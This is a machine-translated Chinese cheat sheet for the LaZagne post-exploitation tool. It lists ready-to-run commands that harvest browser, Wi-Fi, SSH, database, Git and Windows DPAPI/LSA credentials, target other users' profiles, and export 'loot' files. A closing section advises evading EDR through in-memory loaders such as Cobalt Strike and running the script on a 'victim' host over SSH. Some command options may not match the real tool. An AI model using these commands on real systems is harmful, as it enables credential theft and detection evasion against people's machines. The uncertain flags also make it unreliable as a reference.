<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 拉扎涅备忘单

[LaZagne](https://github.com/AlessandroZ/LaZagne) 是一个开源后利用应用程序，用于检索存储在本地计算机上的密码。它支持跨多个类别的 Windows、Linux 和 macOS，包括 Web 浏览器、电子邮件客户端、Wi-Fi 网络、数据库管理软件、系统管理工具和内存缓存。

---

## 目录

- [支持的模块和类别](#supported-modules--categories)
- [安装和二进制文件](#installation--二进制文件)
- [Linux 凭证收集](#linux-credential-harvesting)
- [Windows 凭据收集](#windows-credential-harvesting)
- [目标类别攻击](#targeted-category-attacks)
- [输出格式和文件导出](#output-formats--file-export)
- [操作安全和 EDR 避免](#operational-security--edr-avoidance)

---

## 支持的模块和类别

LaZagne 从数十个应用程序中提取凭据，这些应用程序分为以下几类：
- **浏览器：** Chrome、Firefox、Edge、Opera、Brave、Chromium（历史记录、自动填充、cookie、凭据）。
- **系统管理工具：** WinSCP、PuTTY、OpenSSH（`id_rsa` 密钥/配置）、RDP / mstsc、FileZilla、Cyber​​duck、VNC。
- **数据库：** DBeaver、pgAdmin、Squirrel、Robomongo、SQL Server Management Studio。
- **Wi-Fi：** 在操作系统网络配置文件中存储 WPA2/WPA3 预共享密钥 (PSK)。
- **开发人员和 VCS：** Git 凭证（`.git-credentials`、缓存）、SVN、Docker 令牌、AWS CLI 凭证。
- **电子邮件和聊天：** Thunderbird、Outlook、Pidgin、Skype。
- **Windows Vault 和 DPAPI：** LSA 机密、DPAPI 主密钥、凭据管理器保管库项目。

---

## 安装和二进制文件
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Linux 凭证收集

### 1.运行所有提取模块
```bash
python3 laZagne.py all
```
### 2. 使用 Root / Sudo 权限运行（扩展影子和密钥环访问）
以 `root` 身份运行可解锁系统机密、`/etc/NetworkManager` 中的 Wi-Fi 配置文件以及所有 `/home/*` 目录中的 SSH 密钥：
```bash
sudo python3 laZagne.py all
```
### 3. 从 Gnome Keyring / KWallet 中提取密码
```bash
python3 laZagne.py sysadmin -k
```
---

## Windows 凭据收集

在 Windows 上，使用独立可执行文件 `lazagne.exe`：

### 1.提取所有存储的密码
```cmd
lazagne.exe all
```
### 2. 以提升的权限运行（管理员/系统）
提取 DPAPI 主密钥、LSA 机密和缓存的域凭据：
```cmd
lazagne.exe all -v
```
### 3.提取特定用户的密码（以管理员身份运行时）
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## 有针对性的类别攻击

不要运行所有模块，而是指定目标软件类别以最大限度地减少磁盘活动和噪音：

### 1. 仅限 Web 浏览器
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Wi-Fi 明文密码
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. 系统管理和远程访问工具（SSH、RDP、WinSCP、FileZilla）
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. 数据库客户端
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. 开发人员和 Git 凭证
```bash
# Linux
python3 laZagne.py git
```
---

## 输出格式和文件导出

以结构化格式将获取的凭据直接保存到磁盘：

### 导出为 JSON 格式
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
创建包含结构化凭据、URL、用户名和明文密码的 `/tmp/loot_credentials.json`。

### 导出为纯文本
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
创建 `/tmp/loot_credentials.txt`。

---

## 操作安全和 EDR 避免

- **防病毒检测：** 独立 `lazagne.exe` 受到 Windows Defender 和商业 EDR 解决方案的严格签名。
- **混淆和内存中执行：**
  - 通过 PowerShell 反射或内存加载器（Cobalt Strike / Sliver 中的 `donut`、`execute-assembly`）执行。
  - 将 Python 源版本与自定义虚拟环境一起使用，而不是打包的 PyInstaller 二进制文件。
- **清理工件：** 删除临时战利品文件或通过加密的 C2 信标或 SSH 会话通过标准输出直接重定向输出：
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```